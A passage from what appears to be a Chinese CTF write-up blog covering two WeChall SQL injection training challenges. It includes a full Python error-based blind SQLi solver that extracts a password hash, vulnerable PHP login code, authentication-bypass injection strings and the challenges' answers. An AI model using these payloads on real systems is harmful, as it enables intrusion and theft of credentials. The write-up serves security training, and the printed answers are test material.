invoke__">queryFirst</span>(<span class="variable">$query</span>) ?</span><br><span class="line">        <span class="variable">$chall</span>-&gt;<span class="title function_ invoke__">lang</span>(<span class="string">&#x27;mawekl_blinds_you&#x27;</span>, <span class="keyword">array</span>(<span class="variable">$attempt</span>)) :</span><br><span class="line">        <span class="variable">$chall</span>-&gt;<span class="title function_ invoke__">lang</span>(<span class="string">&#x27;mawekl_blinds_you&#x27;</span>, <span class="keyword">array</span>(<span class="variable">$attempt</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><code>queryFirst()</code> 返回首行或
-false，但三元运算符两端输出<strong>完全相同的文本</strong>。布尔信道和
-timing 信道都不可用。</p>
-<h3 id="solution">Solution</h3>
-<p>利用 <strong>error-based blind SQLi</strong>。MySQL 的 IF()
-根据条件返回不同值：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; OR IF(condition, 1, (SELECT 1 UNION SELECT 2)) --</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>条件为 TRUE → <code>IF</code> 返回 <code>1</code>，WHERE 子句为真 →
-<code>queryFirst</code> 返回一行 → 页面无 MySQL 错误</li>
-<li>条件为 FALSE → <code>IF</code> 执行
-<code>SELECT 1 UNION SELECT 2</code>，返回 2 行 → MySQL 错误 "Subquery
-returns more than 1 row" → 页面出现
-<code>&lt;div class="gwf_errors"&gt;</code></li>
-</ul>
-<p>提取算法完整代码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;Are you blind? — Error-based blind SQLi solver.&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests, re, time, sys</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;https://www.wechall.net/en/challenge/Mawekl/are_you_blind/index.php&#x27;</span></span><br><span class="line">COOKIE = &#123;<span class="string">&#x27;WC&#x27;</span>: <span class="string">&#x27;40700784-72047-P62VMhsWxh3elcYN&#x27;</span>&#125;</span><br><span class="line">HEADERS = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36&#x27;</span>&#125;</span><br><span class="line">ALPHABET = <span class="string">&#x27;0123456789ABCDEF&#x27;</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">s.headers.update(HEADERS)</span><br><span class="line">s.cookies.update(COOKIE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">has_error</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Return True if condition caused MySQL error (condition was FALSE).&quot;&quot;&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;injection&#x27;</span>: payload, <span class="string">&#x27;inject&#x27;</span>: <span class="string">&#x27;Inject&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = s.post(URL, data=data, timeout=<span class="number">15</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;gwf_errors&#x27;</span> <span class="keyword">in</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> has_error(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Reset challenge first</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Resetting challenge...&quot;</span>)</span><br><span class="line">s.get(URL, params=&#123;<span class="string">&#x27;reset&#x27;</span>: <span class="string">&#x27;me&#x27;</span>&#125;)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">recovered = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">33</span>):</span><br><span class="line">    lo, hi = <span class="number">0</span>, <span class="built_in">len</span>(ALPHABET) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> lo &lt; hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        mid_char = ALPHABET[mid]</span><br><span class="line">        <span class="comment"># TRUE: password[pos] &gt; mid_char → no error</span></span><br><span class="line">        <span class="comment"># FALSE: password[pos] &lt;= mid_char → error</span></span><br><span class="line">        payload = <span class="string">f&quot;&#x27; OR IF(SUBSTR(password,<span class="subst">&#123;pos&#125;</span>,1)&gt;&#x27;<span class="subst">&#123;mid_char&#125;</span>&#x27;, 1, (SELECT 1 UNION SELECT 2)) -- &quot;</span></span><br><span class="line">        <span class="keyword">if</span> has_error(payload):</span><br><span class="line">            hi = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lo = mid + <span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    recovered += ALPHABET[lo]</span><br><span class="line">    bar = <span class="string">&#x27;\u2588&#x27;</span> * pos + <span class="string">&#x27;\u2591&#x27;</span> * (<span class="number">32</span> - pos)</span><br><span class="line">    sys.stdout.write(<span class="string">f&#x27;\r[<span class="subst">&#123;bar&#125;</span>] <span class="subst">&#123;pos&#125;</span>/32 | <span class="subst">&#123;recovered&#125;</span>&#x27;</span>)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\n[+] Recovered: <span class="subst">&#123;recovered&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Submit</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Submitting...&quot;</span>)</span><br><span class="line">r = s.post(URL, data=&#123;<span class="string">&#x27;thehash&#x27;</span>: recovered, <span class="string">&#x27;mybutton&#x27;</span>: <span class="string">&#x27;Enter&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;correct&#x27;</span> <span class="keyword">in</span> r.text.lower() <span class="keyword">or</span> <span class="string">&#x27;solved&#x27;</span> <span class="keyword">in</span> r.text.lower():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] SOLVED!&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="string">&#x27;gwf_messages&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    msgs = re.findall(<span class="string">r&#x27;&lt;li&gt;(.*?)&lt;/li&gt;&#x27;</span>, r.text)</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> msgs:</span><br><span class="line">        <span class="keyword">if</span> m.strip():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  MSG: <span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="string">&#x27;gwf_errors&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    errs = re.findall(<span class="string">r&#x27;&lt;li&gt;(.*?)&lt;/li&gt;&#x27;</span>, r.text)</span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> errs:</span><br><span class="line">        <span class="keyword">if</span> e.strip():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  ERR: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;more&#x27;</span> <span class="keyword">in</span> r.text.lower() <span class="keyword">or</span> <span class="string">&#x27;consecutive&#x27;</span> <span class="keyword">in</span> r.text.lower():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[i] Need more consecutive rounds — running again...&quot;</span>)</span><br><span class="line">    success_count = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> success_count &lt; <span class="number">5</span>:</span><br><span class="line">        s.get(URL, params=&#123;<span class="string">&#x27;reset&#x27;</span>: <span class="string">&#x27;me&#x27;</span>&#125;)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        recovered2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">33</span>):</span><br><span class="line">            lo2, hi2 = <span class="number">0</span>, <span class="built_in">len</span>(ALPHABET) - <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> lo2 &lt; hi2:</span><br><span class="line">                mid2 = (lo2 + hi2) // <span class="number">2</span></span><br><span class="line">                mid_char2 = ALPHABET[mid2]</span><br><span class="line">                payload2 = <span class="string">f&quot;&#x27; OR IF(SUBSTR(password,<span class="subst">&#123;pos&#125;</span>,1)&gt;&#x27;<span class="subst">&#123;mid_char2&#125;</span>&#x27;, 1, (SELECT 1 UNION SELECT 2)) -- &quot;</span></span><br><span class="line">                <span class="keyword">if</span> has_error(payload2):</span><br><span class="line">                    hi2 = mid2</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    lo2 = mid2 + <span class="number">1</span></span><br><span class="line">                time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            recovered2 += ALPHABET[lo2]</span><br><span class="line">            sys.stdout.write(<span class="string">f&#x27;\r  Round <span class="subst">&#123;success_count+<span class="number">1</span>&#125;</span>: [<span class="subst">&#123;pos&#125;</span>/32] <span class="subst">&#123;recovered2&#125;</span>&#x27;</span>)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">        r2 = s.post(URL, data=&#123;<span class="string">&#x27;thehash&#x27;</span>: recovered2, <span class="string">&#x27;mybutton&#x27;</span>: <span class="string">&#x27;Enter&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;solved&#x27;</span> <span class="keyword">in</span> r2.text.lower() <span class="keyword">or</span> <span class="string">&#x27;congrat&#x27;</span> <span class="keyword">in</span> r2.text.lower():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[+] SOLVED after <span class="subst">&#123;success_count+<span class="number">1</span>&#125;</span> rounds!&quot;</span>)</span><br><span class="line">            recovered = recovered2</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;correct&#x27;</span> <span class="keyword">in</span> r2.text.lower() <span class="keyword">or</span> <span class="string">&#x27;more&#x27;</span> <span class="keyword">in</span> r2.text.lower():</span><br><span class="line">            success_count += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[i] Round <span class="subst">&#123;success_count&#125;</span> passed, need more...&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[!] Round <span class="subst">&#123;success_count+<span class="number">1</span>&#125;</span> failed&quot;</span>)</span><br><span class="line">            msgs = re.findall(<span class="string">r&#x27;&lt;li&gt;(.*?)&lt;/li&gt;&#x27;</span>, r2.text)</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> msgs:</span><br><span class="line">                <span class="keyword">if</span> m.strip():</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;    <span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\n[*] Final hash: <span class="subst">&#123;recovered&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Check https://www.wechall.net/en/challs for wc_chall_solved_1&quot;</span>)</span><br></pre></td></tr></table></figure>
-<p><strong>关键注意：</strong></p>
-<ul>
-<li>不要手动调用 <code>?reset=me</code>——会断掉连续成功计数</li>
-<li>每成功一次服务器自动生成新 hash 进入下一轮</li>
-<li>脚本中 <code>while success_count &lt; 5</code> 里的
-<code>s.get(URL, params={'reset': 'me'})</code> 是错误写法——正确做法是
-<strong>不 reset</strong>，成功提交后服务器自动发新 hash</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-cgx-10-sql-injection/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-cgx-10-sql-injection/" class="post-title-link" itemprop="url">WeChall - CGX#10 - SQL Injection</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-20 14:54:47 / Modified: 14:54:52" itemprop="dateCreated datePublished" datetime="2026-06-20T14:54:47+08:00">2026-06-20</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-cgx-10-sql-injection/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-cgx-10-sql-injection/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>CGX#10 是 Codegeex 系列的 SQL 注入训练挑战，包含两个登录表单（mask1 /
-mask2），需要分别注入获取 secret word。挑战描述为 "training
-challenge"，属于 Training / Exploit / MySQL 分类。</p>
-<h3 id="solution">Solution</h3>
-<h4 id="problem-1">Problem #1</h4>
-<p>源码位于 <code>mask1.code</code>：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users WHERE username = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line"><span class="variable">$userdata</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$userdata</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Welcome back, <span class="subst">$user</span>, Your first secret word is \&quot;<span class="subst">&#123;$solution&#125;</span>\&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>单引号字符串拼接，无任何过滤。password 用 MD5
-处理但不影响注入——可以在 username 中闭合引号并注释掉 password 检查：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = admin&#x27; --</span><br><span class="line">password = anything</span><br></pre></td></tr></table></figure>
-<p><code>--</code> 后必须有空格。登录成功后页面显示第一个 secret
-word：<strong>silverbullet</strong>。</p>
-<h4 id="problem-2">Problem #2</h4>
-<p><code>mask2.code</code> 只有一行有效代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;solution2.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
-<p>源码不可见，但测试发现改用<strong>双引号</strong>作为字符串定界符：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = admin&quot; OR &quot;1&quot;=&quot;1&quot; --</span><br><span class="line">password = anything</span><br></pre></td></tr></table></figure>
-<p>利用双引号闭合方式绕过。登录后显示第二个 secret
-word：<strong>firestarter</strong>。</p>
-<h4 id="答案">答案</h4>
-<p>两个 secret word 拼接后提交：</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">silverbulletfirestarter</span></span>
 
       
     </div>
